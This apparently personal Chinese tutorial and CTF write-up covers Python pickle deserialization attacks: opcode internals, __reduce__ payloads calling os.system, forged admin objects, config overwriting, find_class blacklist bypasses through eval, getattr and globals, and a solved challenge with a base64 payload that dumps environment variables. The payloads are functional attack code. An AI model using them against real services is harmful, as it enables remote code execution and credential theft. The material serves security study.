---
title: Python pickle 反序列化
date: 2026-08-15 11:20:00
categories:
  - Web安全
tags:
  - Python
  - pickle
  - 反序列化
description: Python pickle 反序列化
---


**Pickle** 是 Python 提供的`序列化与反序列化`模块，用于将 Python 对象转换为字节流或从字节流还原对象。然而，Pickle 的反序列化存在安全隐患，尤其是在处理不可信数据时，可能导致 **远程代码执行（RCE）** 等严重问题。

**pickle 反序列化 == 在执行一段“可以随便跑 Python 代码的脚本”**
 只要让后台对“你可控的数据”做 `pickle.loads()`，你就基本可以 RCE（远程执行命令）。

## 一、什么是（反）序列化

- **序列化（serialize）**：
   把内存里的对象（list、dict、类实例等）→ 变成一串字节 / 字符串，方便：
  - 写进文件
  - 通过网络传输
  - 存到缓存 / 数据库
- **反序列化（deserialize）**：
   把这串字节 / 字符串 → 还原成原来的对象。

类比一下：

- 序列化 = 把一个乐高模型拆成零件，打包装箱。
- 反序列化 = 根据说明书把乐高重新拼回来。

在 Python 里：

```python
import pickle

data = {"user": "admin", "score": 100}

# 序列化
b = pickle.dumps(data)     # b 是一堆 bytes
# 反序列化
obj = pickle.loads(b)      # 又变回了 dict
```

(`dict` 是 Python 中非常重要的内置数据类型，全称是`字典`（dictionary）,字典是一种**键值对（key-value）** 的集合，用于存储数据)

------

## 二、什么是 pickle

**`pickle` 是 Python 自带的“二进制序列化”模块**，特点：

- 能保存几乎所有 Python 对象（类实例、函数引用等）。
- 序列化后的内容是 **Python 专用的二进制协议**（`b'\x80\x04...'` 那种）。
- 协议里不仅有“数据”，还有“如何构造对象”的“指令”。

而 **json** 这种只是数据格式（数字、字符串、列表、对象），**没有“执行逻辑”**。

> **关键区别：**
>
> - `json.loads()`：只是在读数据。
> - `pickle.loads()`：在执行一段“构造对象的脚本”，可以顺带执行任意代码。

## 三、 pickle RCE 核心原理

pickle 的协议里有很多“操作码”（opcodes），支持的东西包括：

- 导入一个模块
- 获取一个全局函数
- 调用这个函数，传入参数
- 构造任意类实例，调用它的 `__setstate__` / `__reduce__` 等特殊方法

所以当你 `pickle.loads()` 一段数据时，它实际上会：

> 一边读数据，一边照着这段数据里写的“脚本”一步步执行。

这就导致：

> **如果反序列化的是用户可控的数据，那么用户写什么，Python 就会乖乖执行什么。**

看个最经典的“恶意 pickle 示例”（demo）：

```python
import pickle
import os

class Evil(object):
    def __reduce__(self):
        # 反序列化时会执行 os.system('calc') 之类的命令
        return (os.system, ('calc',))  # Windows 弹计算器，Linux 可以改成 'ls' 等

payload = pickle.dumps(Evil())
pickle.loads(payload)  # 这里就会执行 os.system('calc')
```

关键点：

- `__reduce__` 返回 `(callable, args)`
- 反序列化时，pickle 会自动做：`callable(*args)`
- 所以你返回 `(os.system, ('rm -rf /',))`,就实现了RCE

## 四、pickle工作原理和常用opcode

pickle可以看作一种独立的栈语言，它由一串串opcode(指令集)组成，该语言的解析是依靠PVM进行的（PVM是一个**专门设计用于序列化和反序列化 Python 对象的栈式虚拟机**）

PVM由以下三部分组成:

- 指令处理器：从流中读取opcode和参数，并对其进行解释处理，重复这个操作，直到遇到`.`这个结束符后停止，最终留在栈顶的值将被作为反序列化对象返回
- stack：由python的list实现，被用来临时存储数据、参数以及对象
- memo：由python的 dict （字典）实现，为PVM的整个生命周期提供存储

[pickle反序列化漏洞基础知识与绕过简析-先知社区](https://xz.aliyun.com/news/13498)

##### ●常用opcode

```python
c：获取一个全局对象或import一个模块      //import

o：寻找栈中的上一个MARK，以之前的第一个数据(必须为函数)为callable，第二个到第n个数据为参数，执行该函数(或实例化一个对象)

i：相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之前的数据为元组，以改元组为参数执行全局函数(或者实例化一个对象)

N：实例化一个None

S：实例化一个字符串对象

V：实例化一个unicode字符串对象

I：实例化一个int对象    //int

F：实例化一个float对象

R：选择栈上的第一个对象作为函数、第二个对象作为参数(第二个对象必须为元组)，然后调用该函数    //调用函数

(：向栈中压入一个MARK标记     //MARK标记

t：寻找栈中上一个MARK，并组合之前的数据为元组    //组合

)：向栈中直接压入一个空元组

l：寻找栈中的上一个MARK，并组合之前的数据为列表

]：向栈中直接压入一个空列表

d：寻找栈中的上一个MARK，并组合之间的数据为字典

}：向栈中直接压入一个空字典

p：将栈顶对象存储值memo_n

g：将memo_n的对象压栈

0：丢弃栈顶对象

b：使用栈中的第一个元素(存储多个属性名：属性值的字典)对第二个元素进行属性设置

s：将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中

u：寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中

a：将栈的第一个元素append到第二个元素(列表)中

e：寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中
```

●PVM工作流程

PVM解析str的过程

![](C:\Users\HP\Desktop\481c10d9-c4ec-4659-96ed-990c8a64e748.gif)

PVM解析__reduce__()过程

![](C:\Users\HP\Desktop\6e66b11b-3ac6-45f1-ae16-22b392f531f8.gif)

demo

```python
opcode=b'''cos  ->c:GLOBAL 操作码 - 导入模块和函数;模块名: os
system          -> 函数名: system
(S'whoami'
tR.'''

cos             ->c,导入os.system，并将函数压入栈
(S'whoami'      ->(，向栈中压入一个MARK，字节码为S是烈火一个字符串对象'whoami'将其 压入栈
tR              ->t，寻找栈中MARK，并组合之间的数据为元组，然后通过字节码R执行os.system('whoami')
.               ->.，程序结束，将栈顶元素os.system('whoami')作为返回值
```

## 五、 pickle 漏洞利用！

pickle.loads(用户可控的数据)

### 1. 命令执行（RCE）

1 原理（核心就是 `__reduce__`）

`pickle` 反序列化一个对象时，会调用它的 `__reduce__` / `__reduce_ex__`。
 `__reduce__` 要返回一个 **“如何重建这个对象”** 的说明，一般形如：

```python
def __reduce__(self):
    return (callable, args)
```

反序列化时 pickle 会做：

```python
callable(*args)
```

> 那如果 `callable = os.system`、`args = ('ls',)` 呢？→ 反序列化瞬间执行系统命令 == RCE

2 最小利用 Demo

```python
import pickle
import os

class Evil:
    def __reduce__(self):
        # 这里换成你想执行的命令
        return (os.system, ('id',))

payload = pickle.dumps(Evil())

# 在靶机上，一旦有：
# pickle.loads(payload)
# 就相当于执行了 os.system('id')
```

CTF 实战中经常是：

- 你本地构造 payload：
  - `payload = pickle.dumps(Evil())`
  - 再 `base64.b64encode(payload)` / `hex()` / url 编码
- 然后塞进：
  - GET 参数
  - POST body
  - Cookie（尤其是 session 之类）
- 访问某个 API，后台 `loads()`，命令就跑了。

3 小结（命令执行要点）

- **关键点**：伪造一个反序列化时会执行危险 call 的对象（`__reduce__`/`__setstate__`）。
- 常用 gadget：
  - `os.system`
  - `subprocess.Popen`
  - 有时是题目自带类里封装好的危险函数。
- 对 CTF：一般就是 **构造 payload → 触发接口 → 扔反弹 shell / 读 flag。**

------

### 2. 实例化对象（伪造/构造任意对象）

命令执行是最暴力的，但很多题目并不一定给你 RCE 的 gadget。
 **但只要服务端把反序列化后的对象用于权限判断 / 业务逻辑，你就可以靠“实例化对象”来打逻辑漏洞。**

1 原理：你能决定“反序列化出的对象长什么样”

例子：题目里有个 `User` 类：

```python
class User:
    def __init__(self, username, is_admin=False):
        self.username = username
        self.is_admin = is_admin

def load_user(token):
    # token 是 cookie + base64 + pickle 之类
    data = base64.b64decode(token)
    user = pickle.loads(data)
    return user

# 某个路由
@app.route('/admin')
def admin():
    user = load_user(request.cookies['session'])
    if not user.is_admin:
        return "forbidden"
    return flag
```

正常逻辑想的是：

- 注册用户的时候，只会创建 `is_admin=False` 的 `User` 对象；
- 然后把它 pickle 存到 cookie 里。

但你现在知道了结构，就可以：

```python
import pickle, base64

class User:
    def __init__(self, username, is_admin=False):
        self.username = username
        self.is_admin = is_admin

# 我直接构造一个 admin 身份
evil_user = User('me', True)
payload = pickle.dumps(evil_user)
token = base64.b64encode(payload).decode()

print(token)
# 设置为 Cookie: session=<token> 即可绕过校验，进入 /admin
```

> 这里我们没有用到命令执行，只是 **伪造了一个“管理员对象”**。
>  这种就是 **“实例化任意对象 → 篡改业务逻辑”**。

2 实战中常见利用点

1. **伪造权限对象**

   - `User(is_admin=True)`
   - `Role(level=999)`
   - `Session(verified=True)`

2. **构造某种状态对象，绕过校验**
    比如有代码：

   ```python
   if isinstance(obj, VIPUser) and obj.balance > 1000:
       send_flag()
   ```

   那你直接构造一个 `VIPUser` 实例，`balance = 999999` 就行。

3. **诱导程序走“调试 / 后门”逻辑**
    某些类可能在特定属性值下，会执行一些危险操作（比如读取文件、连接别的服务）；你通过实例化对象，把它导向这条逻辑。

------

### 3. 变量覆盖（覆盖关键配置 / 状态）

这个是更进一步的视角：

> 反序列化出来的对象，经常会被 **直接赋值给某些全局变量 / 重要字段**。
>  你控制了对象，就等于控制了这些变量。

1 典型代码模式

**1：全局配置被覆盖**

```python
import pickle

config = {
    "debug": False,
    "secret_key": "xxxx",
    "admin_only": True
}

def load_config(data):
    global config
    config = pickle.loads(data)  # ❌ 用户可控数据
```

如果 `data` 来自用户（比如上传配置文件），那你可以：

```python
evil_config = {
    "debug": True,
    "secret_key": "known_to_me",
    "admin_only": False
}

payload = pickle.dumps(evil_config)
# 发送给靶机，让它 load_config(payload)
```

结果：

- `config["debug"] = True` → 可能暴露调试信息 / 交互式 shell；
- `config["secret_key"]` 被你改成已知 → 可以伪造其他签名；
- `config["admin_only"] = False` → 本来要限制的操作不限制了。

**这就是经典的“变量覆盖”利用。**

------

**2：session / user 对象覆盖变量**

```python
current_user = Anonymous()

def load_session(cookie):
    global current_user
    raw = base64.b64decode(cookie)
    current_user = pickle.loads(raw)   # ❌

@app.route('/profile')
def profile():
    # 直接用 current_user，相信它是安全的
    return f"hello {current_user.username}"
```

你伪造一个 `User(username='admin', is_admin=True)`，不仅是实例化对象，
 **还是把全局变量 `current_user` 给换了** —— 后续所有逻辑都会认为你是 admin。

2 CTF 里怎么识别“变量覆盖”利用点

看源码 / 反编译时，注意这样的模式：

- `global xxx; xxx = pickle.loads(...)`
- `self.config = pickle.loads(...)`
- `app.config = pickle.loads(...)`
- `settings = pickle.load(f)` 然后到处用 `settings[...]`

如果：

1. 这些数据源头和**用户输入有关系**（上传、cookie、参数）；
2. 被赋值给的是“权限 / 配置 / 状态类变量”；

那基本就是 **变量覆盖型利用点**：

- 你构造一个看似正常的 dict / 对象，
- 但里面的 key / 属性是你想改的敏感变量。

------

### 4. 小结

1. **命令执行（RCE）**
   - 目标：直接拿命令执行。
   - 手段：`__reduce__` / gadget → `(os.system, ('cmd',))`。
2. **实例化对象**
   - 目标：通过构造某种“合法对象”来骗业务逻辑。
   - 手段：构造 `User/Admin/Config` 等实例，控制属性，绕过权限 / 校验。
3. **变量覆盖**
   - 目标：改掉程序中某些关键变量的值（配置、状态、权限位）。
   - 手段：利用反序列化赋值的地方（global / config / session），用你构造的对象 / dict 把它们覆盖。

>  2+3 搭配：先用变量覆盖搞到 admin，再去访问某个只允许 admin 调的 RCE 功能。

## 六、绕过

#### `find_class()`绕过

​        对方想用 `find_class()` 限制你能用哪些类/函数，但写得不严，你就拿“允许的那些东西”当 gadget，绕一圈做到自己想做的事（RCE / 提权 / 变量覆盖）

绕过 find_class 有两个关键点：

1. `find_class()` 只会在执行 `c / i / \x93` 这几条“取全局对象”的 opcode 时调用一次。
   只要你在这一步拿到的是一个“看起来安全”的函数（比如 `eval` / `__import__` / 某个自定义 gadget），之后再在这个函数内部 `__import__("os")`、调用黑名单函数，`find_class()` 就完全看不到了 → 黑名单形同虚设

   例如：

   ```python
   def __reduce__(self):
       # 只用白名单里的 builtins.eval
       #真正的 os 是在 eval 里面动态 import 出来的
       return (eval, ('__import__("os").system("id")',))
   ```

<img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20251116210551401.png" alt="image-20251116210551401" style="zoom: 50%;" />

##### 例：(这里限制只能用builtins 模块)

```python
import pickle, builtins, io

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # 只允许 builtins 模块
        if module == "builtins":
            return getattr(builtins, name)
        raise pickle.UnpicklingError("forbidden")

def safe_loads(data):
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

利用点：`builtins` 里面不止有 `list` / `dict`，还有一堆危险的：

```python
eval, exec, open, __import__, getattr, setattr, dir, ...
```

**解决**：利用 `builtins.eval` + `__import__` 绕过

我们构造一个对象，它的 `__reduce__` 返回 `(eval, ('__import__("os").system("id")',))`：

```python
import pickle

class Evil:
    def __reduce__(self):
        # 注意：这里只用到了 builtins.eval
        # 真正的 os 是在 eval 里面动态 import 出来的
        return (eval, ('__import__("os").system("id")',))

payload = pickle.dumps(Evil(), protocol=4)
print(payload)
```

这个 pickle 反汇编一下大概是这样（核心部分）：

```python
GLOBAL 'builtins' 'eval'
...
STRING '__import__("os").system("id")'
REDUCE
```

反序列化过程：

1. Unpickler 看到 `GLOBAL 'builtins' 'eval'`→ 调用自定义 `find_class("builtins", "eval")`→ 允许，通过 `getattr(builtins, "eval")` 拿到 `eval` 函数。
2. 再看到 `REDUCE`→ 调用 `eval('__import__("os").system("id")')`
3. 这行代码执行时才真正 `import os`，再 `system("id")`，完成 RCE。

如果禁了 `eval`，还可以：

- 用 `builtins.__import__` + `getattr`：
   `__import__("os").popen("cat /flag").read()`
- 或者允许了其他能执行代码的 gadget

#### `builtins`绕过

##### 1.如果靶场代码中通过getattr获取对象的属性名字，因此我们可以通过builtins.getattr(builtins,'eval')来获取eval函数。

假设有这样的 `find_class`：

```python
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        blacklist = {('builtins', 'eval')}
        if (module, name) in blacklist:
            raise pickle.UnpicklingError("forbidden")
        return super().find_class(module, name)
```

- 直接用 `(eval, (...))` 做 `__reduce__`：
   payload 里会有 `GLOBAL 'builtins' 'eval'` → `find_class('builtins','eval')` → 被黑名单拦截。

- 如果改成：

  ```python
  def __reduce__(self):
      import builtins
      # 这里 callable 是 builtins.getattr，是被允许的
      return (getattr, (builtins, 'eval'))
  ```

  反序列化时做的事是：`getattr(builtins, 'eval')` → 返回 eval 函数本身。

或者：

```python
def __reduce__(self):
    import builtins
    code = '__import__("os").system("id")'
    # 先通过 getattr 拿 eval，再立刻执行
    return (getattr(builtins, 'eval'), (code,))
```

在 pickle opcode 层面：

- `GLOBAL 'builtins' 'getattr'` → `find_class('builtins','getattr')` ✅
- 没有出现 `GLOBAL 'builtins' 'eval'`，黑名单感知不到。
- 真正的 `eval` 是在运行时通过 `getattr` 拿到的。

##### 2.用 `globals()` 从全局变量拿模块（绕过 import 限制）

例如：

```python
import os

print(globals().keys())
# 里面可能有：'__name__', '__package__', 'os', ...

m = globals()['os']
m.system('echo hello from globals')
```

解释：

- `globals()` 返回当前模块的“全局变量字典”，key 是变量名，value 是对象；
- 任何在文件顶部 `import` 的模块（包括自己写的模块），都存在 `globals()` 里；
- 不需要再调用 `__import__`，直接通过 `globals()['os']` 拿到模块对象。

所以如果对方禁止你用 `__import__`、禁止你在 pickle 里出现 `'os' 'system'` 这种组合，但 **它在上面已经 `import os` 过了**，你就能：

```python
globals()['os'].system("id")
```

完成命令执行，完全不走 `find_class('os', 'system')` 这条路。

#### 以上绕过小结：

- **`getattr` 绕过“函数名黑名单”**：
   不能写 `eval`、`system`，那就写 `getattr(builtins, 'eval')`、`getattr(os_mod, 'system')`，
   黑名单只看 “直接访问”，看不到你动态取属性。
- **`globals()` 绕过“import 限制”**：
   不能 `__import__('os')`没关系，很多模块已经在全局变量里了，`globals()['os']` 直接拿来用。
- **`find_class()` 只检查 opcodes 里直接出现的 (module, name)，**不管你运行时通过 `getattr` / `globals` 又拿出了多少“黑名单函数”。

#### 禁止`R指令`的绕过

- 使用i指令

```python
opcode=b'''(S'stao'
I18
i__main__
Animal
.'''
#obj = Animal('stao', 18)
```

- 使用o指令

```python
opcode=b'''(c__main__
Animal
S'stao'
I18
o.'''
#obj = Animal('stao', 18)
```

- 变量覆盖

```python
opcode = b'''c__main__
stao
(S'name'
S'Hacker'
S'age'
I18
db.'''

#{'name': 'Hacker', 'age': 18}
```

- b指令

```python
opcode=b'''(c__main__
Animal
S'Casual'
I18
o}(S"__setstate__"    #向栈中压入一个空字典，然后再通过u修改为{"__setstate__":os.system}
cos
system
ubS"whoami"
b.'''

#os.system("whoami")
```

#### 十六进制绕过

**在 Python 字符串里用 `\x52` 代替 `'R'`**

```python
b'R'           # 明文 R
b'\x52'        # 十六进制写法，但实际上还是那个字节
```

如果过滤器只是 `if 'R' in source_code: ...` 这样的弱检查，也能被绕。

## 七、补充：

#### pickletools的使用

pickletools是python的一个内建模块,常用的方法有`pickletools.dis()`,用于把一段opcode转换为易读的形式,如:

(在做题时，可用pickletools进行验证写的opcode是否实现)

```python
import pickletools

opcode = b'''c__main__
secret
(S'secret'
S'Hack!!!'
db.'''

pickletools.dis(opcode)
```

输出

```python
0: c    GLOBAL     '__main__ secret'
   17: (    MARK
   18: S        STRING     'secret'
   28: S        STRING     'Hack!!!'
   39: d        DICT       (MARK at 17)
   40: b    BUILD
   41: .    STOP
highest protocol among opcodes = 0
```

#### pker的使用

pker是一个可以把python语言翻译成opcode的工具.

pker支持这三种操作

- 变量赋值：
  - 左值可以是变量名，dict或list的item，对象成员
  - 右值可以是基础类型字面量，函数调用
- 函数调用
- return：可返回0~1个参数

pker内置了三个函数

```python
GLOBAL('os', 'system')             =>  cos\nsystem\n
INST('os', 'system', 'ls')         =>  (S'ls'\nios\nsystem\n
OBJ(GLOBAL('os', 'system'), 'ls')  =>  (cos\nsystem\nS'ls'\no
```

可以用return返回一个对象

```python
return           =>  .
return var       =>  g_\n.
return 1         =>  I1\n.
#pker_test.py

i = 0
s = 'id'
lst = [i]
tpl = (0,)
dct = {tpl: 0}
system = GLOBAL('os', 'system')
system(s)
return
#命令行下

$ python3 pker.py < pker_tests.py

b"I0\np0\n0S'id'\np1\n0(g0\nlp2\n0(I0\ntp3\n0(g3\nI0\ndp4\n0cos\nsystem\np5\n0g5\n(g1\ntR."
```

# 例题1:[0xGame_2025_week2]马哈鱼商店（Pickle反序列化）

注册登录后，抓包改折扣，购买Pickle

![](C:\Users\HP\Desktop\Screenshots\屏幕截图 2025-11-11 224855.png)

购买成功

<img src="C:\Users\HP\Desktop\Screenshots\屏幕截图 2025-11-11 225753.png" style="zoom:33%;" />

得到源码

```python
Use GET To Send Your Loved Data!!!
BlackList = [b'\x00', b'\x1e']

@app.route('/pickle_dsa')
def pic():
 data = request.args.get('data')
  if not data:
      return "Use GET To Send Your Loved Data"
  try:
  data = base64.b64decode(data)
      except Exception:
      return "Cao!!!"
  for b in BlackList:
      if b in data:
      return "卡了"
  p = pickle.loads(data)
  print(p)
  return f"<p>Vamos! {p}<p>
```

这是个pickle，过滤了⼀些不可⻅字符，读取环境变量即可：

```python
import base64
opcode = '''csubprocess
check_output
(S'env'
tR.'''.encode()
print(base64.b64encode(opcode).decode())
```

运行结果：Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CihTJ2VudicKdFIu

📌代码解释：

- `csubprocess` - c导入subprocess模块

- `check_output` - 引用subprocess.check_output函数

- `(S'env'` - (开始元组并压入字符串'env'

- `tR` - t完成元组并调用函数

- `.` - .结束

当服务器反序列化这个payload时，会执行`subprocess.check_output(['env'])`，也就是运行`env`命令来显示所有环境变量。

payload:`?data = Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CihTJ2VudicKdFIu`

0xGame{You_Have_Learned_How_to_Buy_Pickle!!}